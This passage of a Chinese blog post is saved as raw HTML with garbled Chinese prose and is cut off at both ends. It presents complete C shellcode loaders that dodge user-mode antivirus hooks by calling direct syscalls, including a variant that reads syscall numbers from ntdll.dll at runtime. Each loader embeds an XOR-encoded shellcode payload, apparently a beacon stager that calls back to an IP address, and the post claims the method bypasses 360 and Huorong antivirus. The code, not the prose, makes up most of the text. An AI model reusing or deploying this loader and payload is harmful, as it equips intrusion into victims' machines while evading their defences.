class="line"><span class="params">	_In_opt_ HANDLE Process,</span></span><br><span class="line"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	_In_ SIZE_T* RegionSize,</span></span><br><span class="line"><span class="params">	_In_ ULONG AllocationType,</span></span><br><span class="line"><span class="params">	_In_ ULONG PageProtection,</span></span><br><span class="line"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span><br><span class="line"><span class="params">	_In_ ULONG ParameterCount)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtWriteVirtualMemory)</span><span class="params">(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferLength, PULONG ReturnLength OPTIONAL)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown</span></span><br><span class="line"><span class="params">	)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼‚æˆ–åçš„shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xbe\x0a\xc1\xa6\xb2\xaa\x8a\x42\x42\x42\x03\x13\x03\x12\x10\x13\x14\x0a\x73\x90\x27\x0a\xc9\x10\x22\x0a\xc9\x10\x5a\x0a\xc9\x10\x62\x0a\xc9\x30\x12\x0a\x4d\xf5\x08\x08\x0f\x73\x8b\x0a\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x03\x83\x8b\x4f\x03\x43\x83\xa0\xaf\x10\x03\x13\x0a\xc9\x10\x62\xc9\x00\x7e\x0a\x43\x92\x24\xc3\x3a\x5a\x49\x40\x37\x30\xc9\xc2\xca\x42\x42\x42\x0a\xc7\x82\x36\x25\x0a\x43\x92\x12\xc9\x0a\x5a\x06\xc9\x02\x62\x0b\x43\x92\xa1\x14\x0a\xbd\x8b\x03\xc9\x76\xca\x0a\x43\x94\x0f\x73\x8b\x0a\x73\x82\xee\x03\x83\x8b\x4f\x03\x43\x83\x7a\xa2\x37\xb3\x0e\x41\x0e\x66\x4a\x07\x7b\x93\x37\x9a\x1a\x06\xc9\x02\x66\x0b\x43\x92\x24\x03\xc9\x4e\x0a\x06\xc9\x02\x5e\x0b\x43\x92\x03\xc9\x46\xca\x0a\x43\x92\x03\x1a\x03\x1a\x1c\x1b\x18\x03\x1a\x03\x1b\x03\x18\x0a\xc1\xae\x62\x03\x10\xbd\xa2\x1a\x03\x1b\x18\x0a\xc9\x50\xab\x0d\xbd\xbd\xbd\x1f\x28\x42\x0b\xfc\x35\x2b\x2c\x2b\x2c\x27\x36\x42\x03\x14\x0b\xcb\xa4\x0e\xcb\xb3\x03\xf8\x0e\x35\x64\x45\xbd\x97\x0a\x73\x8b\x0a\x73\x90\x0f\x73\x82\x0f\x73\x8b\x03\x12\x03\x12\x03\xf8\x78\x14\x3b\xe5\xbd\x97\xa9\x31\x18\x0a\xcb\x83\x03\xfa\x6a\x41\x42\x42\x0f\x73\x8b\x03\x13\x03\x13\x28\x41\x03\x13\x03\xf8\x15\xcb\xdd\x84\xbd\x97\xa9\x1b\x19\x0a\xcb\x83\x0a\x73\x90\x0b\xcb\x9a\x0f\x73\x8b\x10\x2a\x42\x40\x02\xc6\x10\x10\x03\xf8\xa9\x17\x6c\x79\xbd\x97\x0a\xcb\x84\x0a\xc1\x81\x12\x28\x48\x1d\x0a\xcb\xb3\x0a\xcb\x98\x0b\x85\x82\xbd\xbd\xbd\xbd\x0f\x73\x8b\x10\x10\x03\xf8\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc7\xdf\x43\x42\x42\x0a\xbd\x8d\x4d\xc6\xce\x43\x42\x42\xa9\x91\xab\xa6\x43\x42\x42\xaa\xe0\xbd\xbd\xbd\x6d\x28\x08\x11\x14\x42\x2c\xaf\xcb\x27\xf3\xeb\x79\x89\x97\xe9\x9e\x82\x2b\x92\x89\x37\x1b\x18\x0f\xfb\x7f\x6f\x51\xaf\xd2\xe8\x4e\x3e\x46\xfd\xf9\x48\xbb\x8a\x77\x46\xa2\xae\x4b\x48\x90\xed\xd7\x70\xa0\xea\xe8\xff\x56\xcc\x0f\xa1\x60\xf5\x32\x38\xfc\x5f\xa5\x65\x08\xd6\x8d\x3c\x2e\x6d\xad\x5d\x3f\xa4\xe2\x00\x8a\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x62\x0e\x00\x00\x10\x0d\x15\x11\x07\x10\x4f\x48\x42\x9a\xd8\x83\x80\x12\x4c\x94\x3e\x35\x26\x4a\xb4\x1b\x66\xd3\xf9\xcf\x15\x15\xb4\xef\x52\x8c\x9a\x93\x5d\xad\x04\x25\x97\x2d\xb4\xf4\x6b\xd4\x1e\xd0\x29\xd2\xfa\xfe\x7f\xf3\x29\xa5\x7e\x27\x1b\x09\x81\x60\x12\x17\x47\xf4\xe0\x34\x4c\xd6\x63\x50\xd5\x79\x95\x32\xbe\x75\x69\x28\x15\x36\x6a\xcf\xf8\xbe\x39\x5b\x9e\x23\x43\xce\xc1\x27\x85\x92\x80\x15\x54\x82\x47\x51\x33\x6e\x1a\x06\x6a\x59\xd3\xc5\xf4\xaa\x46\xed\xf7\x03\x57\x17\x93\xab\x39\xb4\xb2\xed\x09\x74\xb1\x25\x22\x32\xbb\xd2\x64\xee\xc9\x94\xb1\x31\x63\x57\x71\xe2\x44\x19\x71\x61\x5a\x72\x3d\xe9\x90\xd1\x7e\x81\x87\xf0\xe4\x8c\xe1\x0f\x57\xc4\xe2\xeb\x7b\x89\x64\x66\x34\x5a\x0b\xba\xc2\x9b\x3e\x4c\xc8\xfd\x8e\x31\xcc\xe9\x63\x04\x4c\x94\x15\xea\x63\xc6\xcd\x4c\xfa\xa1\xa4\x9c\x34\x86\x87\x1f\xe8\x37\x1c\x3e\xf8\xac\xac\xdd\x88\xc2\x73\xa2\x3b\x25\x3b\x81\x77\x18\x04\x8f\x97\xc2\x3b\xdf\x86\x89\x42\x03\xfc\xb2\xf7\xe0\x14\xbd\x97\x0a\x73\x8b\xf8\x42\x42\x02\x42\x03\xfa\x42\x52\x42\x42\x03\xfb\x02\x42\x42\x42\x03\xf8\x1a\xe6\x11\xa7\xbd\x97\x0a\xd1\x11\x11\x0a\xcb\xa5\x0a\xcb\xb3\x0a\xcb\x98\x03\xfa\x42\x62\x42\x42\x0b\xcb\xbb\x03\xf8\x50\xd4\xcb\xa0\xbd\x97\x0a\xc1\x86\x62\xc7\x82\x36\xf4\x24\xc9\x45\x0a\x43\x81\xc7\x82\x37\x95\x1a\x1a\x1a\x0a\x47\x42\x42\x42\x42\x12\x81\xaa\xdd\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x71\x70\x42\x78\x9c\x2a\xf3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)&amp;NtAllocateVirtualMemoryExProc;</span><br><span class="line">pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)&amp;NtWriteVirtualMemoryProc;</span><br><span class="line">pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)&amp;NtCreateThreadExProc;</span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	HANDLE hProcess = GetCurrentProcess();</span><br><span class="line">	NTSTATUS status = NtAllocateVirtualMemoryEx(hProcess, &amp;Address, &amp;uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// è¿˜åŸå¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buf); i++) &#123;</span><br><span class="line">		buf[i] ^= <span class="number">66</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	status = NtWriteVirtualMemory(hProcess, Address, buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	NtCreateThreadEx(&amp;hThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)Address, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šæ·»åŠ asmçš„ä»£ç ä¹Ÿå¯ä»¥è¿™æ ·å†™ï¼Œå°†asmä¸­çš„ä»£ç æ”¹å†™æ”¾åœ¨ä»¥ä¸‹å½¢å¼main.cppä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//syscall.asm</span><br><span class="line">CHAR NtAllocateVirtualMemoryExProc[] = &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   //mov r10,rcx</span><br><span class="line">	0xb8,0x76,0x00,0x00,0x00, //mov eax,076h</span><br><span class="line">	0x0f,0x05,   //syscall</span><br><span class="line">	0xc3   //ret</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtWriteVirtualMemoryProc[] = &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   //mov r10,rcx</span><br><span class="line">	0xb8,0x3a,0x00,0x00,0x00, //mov eax,03Ah</span><br><span class="line">	0x0f,0x05,   //syscall</span><br><span class="line">	0xc3   //ret</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtCreateThreadExProc[] = &#123;</span><br><span class="line">	0x4c,0x8b,0xd1,   //mov r10,rcx</span><br><span class="line">	0xb8,0xc1,0x00,0x00,0x00, //mov eax,0C1h</span><br><span class="line">	0x0f,0x05,   //syscall</span><br><span class="line">	0xc3   //ret</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡è¯¥æ–¹æ³• é‡æ–°R3å±‚API æ€è½¯(ç”¨æˆ·æ€)å°±æ— æ³•ç›‘æ§æˆ‘ä»¬ä½¿ç”¨çš„APIå‡½æ•°ä»è€Œå»bypass<br>åŠ¨æ€é™æ€å¯è¿‡360ã€ç«ç»’ ï¼ˆ2022.11.26ï¼‰<br><img src="/posts/b3138fd/7.png"><br><img src="/posts/b3138fd/8.png"></p>
<h5 id="åŠ¨æ€è¯»å–ntdll-dllä¸­å‡½æ•°è·å–ç³»ç»Ÿè°ƒç”¨å·"><a href="#åŠ¨æ€è¯»å–ntdll-dllä¸­å‡½æ•°è·å–ç³»ç»Ÿè°ƒç”¨å·" class="headerlink" title="åŠ¨æ€è¯»å–ntdll.dllä¸­å‡½æ•°è·å–ç³»ç»Ÿè°ƒç”¨å·"></a>åŠ¨æ€è¯»å–ntdll.dllä¸­å‡½æ•°è·å–ç³»ç»Ÿè°ƒç”¨å·</h5><p>å¯¹äºä¸åŒçš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œè¿›å…¥å†…æ ¸çš„ç³»ç»Ÿè°ƒç”¨å·éƒ½å¤§ä¸ç›¸åŒ<br>æ‰€ä»¥å‰é¢æ‰‹åŠ¨å»æ‰¾å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·çš„æ–¹æ³•å­˜åœ¨å…¼å®¹æ€§é—®é¢˜ï¼Œéœ€è¦å¯¹ä¸åŒçš„ç³»ç»Ÿåšä¸åŒçš„å¤„ç†ã€‚</p>
<p>æµç¨‹:</p>
<ul>
<li><ol>
<li>é€šè¿‡GetProcAddressè·å–ntdllä¸­çš„NtReadVirtualMemory å‡½æ•°åœ°å€</li>
</ol>
</li>
<li><ol start="2">
<li>è¯»å–å‡½æ•°åç§»0x04 è·å–ç³»ç»Ÿè°ƒç”¨å·</li>
</ol>
</li>
<li><ol start="3">
<li>ç¼–å†™å‡½æ•°è°ƒç”¨æ¨¡æ¿å¹¶å¡«å…¥ç³»ç»Ÿè°ƒç”¨å·</li>
</ol>
</li>
<li><ol start="4">
<li>ç¼–å†™å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°æ¨¡æ¿<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®åŠ¨æ€è·å–ntdllä¸­çš„å‡½æ•°ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">VOID <span class="title function_">SetSysCall</span><span class="params">(TCHAR* szFuncName)</span> &#123;</span><br><span class="line">	DWORD SysCallid = <span class="number">0</span>;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hModule) &#123;   </span><br><span class="line">		DWORD64 FuncAddr = (DWORD64)GetProcAddress(hModule, (LPCSTR)szFuncName);</span><br><span class="line">		<span class="comment">//è¯»å–çš„åŸºåœ°å€æŒ‡å‘0xb8çš„åœ°å€</span></span><br><span class="line">		LPVOID CallAddr = (LPVOID)(FuncAddr + <span class="number">4</span>); </span><br><span class="line">		<span class="comment">//ä»0xb8å¼€å§‹è¯»å–2ä¸ªå­—èŠ‚</span></span><br><span class="line">		ReadProcessMemory(GetCurrentProcess(), CallAddr, &amp;SysCallid, <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="comment">//å¤åˆ¶2ä¸ªå­—èŠ‚åˆ°æ•°ç»„</span></span><br><span class="line">		<span class="built_in">memcpy</span>(FuncExample + <span class="number">4</span>, (CHAR*)&amp;SysCallid, <span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)<span class="comment">//.dataæ®µå¯æ‰§è¡Œ</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å‡½æ•°æ¨¡æ¿</span></span><br><span class="line">CHAR FuncExample[] = &#123;</span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span>   <span class="comment">//ret</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//åˆå§‹åŒ–ä¸‹ ï¼ˆå†™çš„æœ‰äº›ä¸‘é™‹äº†...ï¼‰</span></span><br><span class="line">CHAR NtAllocateVirtualMemoryExProc[] = &#123; </span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtWriteVirtualMemoryProc[] = &#123; </span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CHAR NtCreateThreadExProc[] = &#123;</span><br><span class="line">	<span class="number">0x4c</span>,<span class="number">0x8b</span>,<span class="number">0xd1</span>,   <span class="comment">//mov r10,rcx</span></span><br><span class="line">	<span class="number">0xb8</span>,<span class="number">0xb9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>, <span class="comment">//mov eax,0B9h</span></span><br><span class="line">	<span class="number">0x0f</span>,<span class="number">0x05</span>,   <span class="comment">//syscall</span></span><br><span class="line">	<span class="number">0xc3</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtAllocateVirtualMemoryEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	_In_opt_ HANDLE Process,</span></span><br><span class="line"><span class="params">	_In_opt_ PVOID* BaseAddress,</span></span><br><span class="line"><span class="params">	_In_ SIZE_T* RegionSize,</span></span><br><span class="line"><span class="params">	_In_ ULONG AllocationType,</span></span><br><span class="line"><span class="params">	_In_ ULONG PageProtection,</span></span><br><span class="line"><span class="params">	_Inout_updates_opt_(ParameterCount) MEM_EXTENDED_PARAMETER* Parameters,</span></span><br><span class="line"><span class="params">	_In_ ULONG ParameterCount</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtWriteVirtualMemory)</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	PVOID BaseAddress,</span></span><br><span class="line"><span class="params">	PVOID Buffer,</span></span><br><span class="line"><span class="params">	ULONG BufferLength,</span></span><br><span class="line"><span class="params">	PULONG ReturnLength OPTIONAL</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(NTAPI* pNtCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">	PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">	ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">	LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">	HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">	LPVOID lpParameter,</span></span><br><span class="line"><span class="params">	ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">	SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">	SIZE_T StackSize,</span></span><br><span class="line"><span class="params">	SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">	LPVOID pUnkown</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®è·å–å‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">VOID <span class="title function_">SetSysCall</span><span class="params">(TCHAR* szFuncName)</span> &#123;</span><br><span class="line">	DWORD SysCallid = <span class="number">0</span>;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hModule) &#123;</span><br><span class="line">		DWORD64 FuncAddr = (DWORD64)GetProcAddress(hModule, (LPCSTR)szFuncName);</span><br><span class="line">		LPVOID CallAddr = (LPVOID)(FuncAddr + <span class="number">4</span>); <span class="comment">//è¯»å–çš„åŸºåœ°å€æŒ‡å‘0xb8çš„åœ°å€</span></span><br><span class="line">		ReadProcessMemory(GetCurrentProcess(), CallAddr, &amp;SysCallid, <span class="number">2</span>, <span class="literal">NULL</span>);<span class="comment">//ä»0xb8å¼€å§‹è¯»å–2ä¸ªå­—èŠ‚</span></span><br><span class="line">		<span class="built_in">memcpy</span>(FuncExample + <span class="number">4</span>, (CHAR*)&amp;SysCallid, <span class="number">2</span>);<span class="comment">//å¤åˆ¶2ä¸ªå­—èŠ‚åˆ°æ•°ç»„</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼‚æˆ–åçš„shellcode</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xbe\x0a\xc1\xa6\xb2\xaa\x8a\x42\x42\x42\x03\x13\x03\x12\x10\x13\x14\x0a\x73\x90\x27\x0a\xc9\x10\x22\x0a\xc9\x10\x5a\x0a\xc9\x10\x62\x0a\xc9\x30\x12\x0a\x4d\xf5\x08\x08\x0f\x73\x8b\x0a\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x03\x83\x8b\x4f\x03\x43\x83\xa0\xaf\x10\x03\x13\x0a\xc9\x10\x62\xc9\x00\x7e\x0a\x43\x92\x24\xc3\x3a\x5a\x49\x40\x37\x30\xc9\xc2\xca\x42\x42\x42\x0a\xc7\x82\x36\x25\x0a\x43\x92\x12\xc9\x0a\x5a\x06\xc9\x02\x62\x0b\x43\x92\xa1\x14\x0a\xbd\x8b\x03\xc9\x76\xca\x0a\x43\x94\x0f\x73\x8b\x0a\x73\x82\xee\x03\x83\x8b\x4f\x03\x43\x83\x7a\xa2\x37\xb3\x0e\x41\x0e\x66\x4a\x07\x7b\x93\x37\x9a\x1a\x06\xc9\x02\x66\x0b\x43\x92\x24\x03\xc9\x4e\x0a\x06\xc9\x02\x5e\x0b\x43\x92\x03\xc9\x46\xca\x0a\x43\x92\x03\x1a\x03\x1a\x1c\x1b\x18\x03\x1a\x03\x1b\x03\x18\x0a\xc1\xae\x62\x03\x10\xbd\xa2\x1a\x03\x1b\x18\x0a\xc9\x50\xab\x0d\xbd\xbd\xbd\x1f\x28\x42\x0b\xfc\x35\x2b\x2c\x2b\x2c\x27\x36\x42\x03\x14\x0b\xcb\xa4\x0e\xcb\xb3\x03\xf8\x0e\x35\x64\x45\xbd\x97\x0a\x73\x8b\x0a\x73\x90\x0f\x73\x82\x0f\x73\x8b\x03\x12\x03\x12\x03\xf8\x78\x14\x3b\xe5\xbd\x97\xa9\x31\x18\x0a\xcb\x83\x03\xfa\x6a\x41\x42\x42\x0f\x73\x8b\x03\x13\x03\x13\x28\x41\x03\x13\x03\xf8\x15\xcb\xdd\x84\xbd\x97\xa9\x1b\x19\x0a\xcb\x83\x0a\x73\x90\x0b\xcb\x9a\x0f\x73\x8b\x10\x2a\x42\x40\x02\xc6\x10\x10\x03\xf8\xa9\x17\x6c\x79\xbd\x97\x0a\xcb\x84\x0a\xc1\x81\x12\x28\x48\x1d\x0a\xcb\xb3\x0a\xcb\x98\x0b\x85\x82\xbd\xbd\xbd\xbd\x0f\x73\x8b\x10\x10\x03\xf8\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc7\xdf\x43\x42\x42\x0a\xbd\x8d\x4d\xc6\xce\x43\x42\x42\xa9\x91\xab\xa6\x43\x42\x42\xaa\xe0\xbd\xbd\xbd\x6d\x28\x08\x11\x14\x42\x2c\xaf\xcb\x27\xf3\xeb\x79\x89\x97\xe9\x9e\x82\x2b\x92\x89\x37\x1b\x18\x0f\xfb\x7f\x6f\x51\xaf\xd2\xe8\x4e\x3e\x46\xfd\xf9\x48\xbb\x8a\x77\x46\xa2\xae\x4b\x48\x90\xed\xd7\x70\xa0\xea\xe8\xff\x56\xcc\x0f\xa1\x60\xf5\x32\x38\xfc\x5f\xa5\x65\x08\xd6\x8d\x3c\x2e\x6d\xad\x5d\x3f\xa4\xe2\x00\x8a\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x62\x0e\x00\x00\x10\x0d\x15\x11\x07\x10\x4f\x48\x42\x9a\xd8\x83\x80\x12\x4c\x94\x3e\x35\x26\x4a\xb4\x1b\x66\xd3\xf9\xcf\x15\x15\xb4\xef\x52\x8c\x9a\x93\x5d\xad\x04\x25\x97\x2d\xb4\xf4\x6b\xd4\x1e\xd0\x29\xd2\xfa\xfe\x7f\xf3\x29\xa5\x7e\x27\x1b\x09\x81\x60\x12\x17\x47\xf4\xe0\x34\x4c\xd6\x63\x50\xd5\x79\x95\x32\xbe\x75\x69\x28\x15\x36\x6a\xcf\xf8\xbe\x39\x5b\x9e\x23\x43\xce\xc1\x27\x85\x92\x80\x15\x54\x82\x47\x51\x33\x6e\x1a\x06\x6a\x59\xd3\xc5\xf4\xaa\x46\xed\xf7\x03\x57\x17\x93\xab\x39\xb4\xb2\xed\x09\x74\xb1\x25\x22\x32\xbb\xd2\x64\xee\xc9\x94\xb1\x31\x63\x57\x71\xe2\x44\x19\x71\x61\x5a\x72\x3d\xe9\x90\xd1\x7e\x81\x87\xf0\xe4\x8c\xe1\x0f\x57\xc4\xe2\xeb\x7b\x89\x64\x66\x34\x5a\x0b\xba\xc2\x9b\x3e\x4c\xc8\xfd\x8e\x31\xcc\xe9\x63\x04\x4c\x94\x15\xea\x63\xc6\xcd\x4c\xfa\xa1\xa4\x9c\x34\x86\x87\x1f\xe8\x37\x1c\x3e\xf8\xac\xac\xdd\x88\xc2\x73\xa2\x3b\x25\x3b\x81\x77\x18\x04\x8f\x97\xc2\x3b\xdf\x86\x89\x42\x03\xfc\xb2\xf7\xe0\x14\xbd\x97\x0a\x73\x8b\xf8\x42\x42\x02\x42\x03\xfa\x42\x52\x42\x42\x03\xfb\x02\x42\x42\x42\x03\xf8\x1a\xe6\x11\xa7\xbd\x97\x0a\xd1\x11\x11\x0a\xcb\xa5\x0a\xcb\xb3\x0a\xcb\x98\x03\xfa\x42\x62\x42\x42\x0b\xcb\xbb\x03\xf8\x50\xd4\xcb\xa0\xbd\x97\x0a\xc1\x86\x62\xc7\x82\x36\xf4\x24\xc9\x45\x0a\x43\x81\xc7\x82\x37\x95\x1a\x1a\x1a\x0a\x47\x42\x42\x42\x42\x12\x81\xaa\xdd\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x71\x70\x42\x78\x9c\x2a\xf3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	LPVOID Address = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T uSize = <span class="number">0x1000</span>;</span><br><span class="line">	  </span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtAllocateVirtualMemoryEx&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtAllocateVirtualMemoryExProc,FuncExample, <span class="built_in">strlen</span>(FuncExample));</span><br><span class="line">	pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)&amp;NtAllocateVirtualMemoryExProc;</span><br><span class="line">	</span><br><span class="line">	SetSysCall((TCHAR*)<span class="string">&quot;NtWriteVirtualMemory&quot;</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(NtWriteVirtualMemoryProc, FuncExample, <span 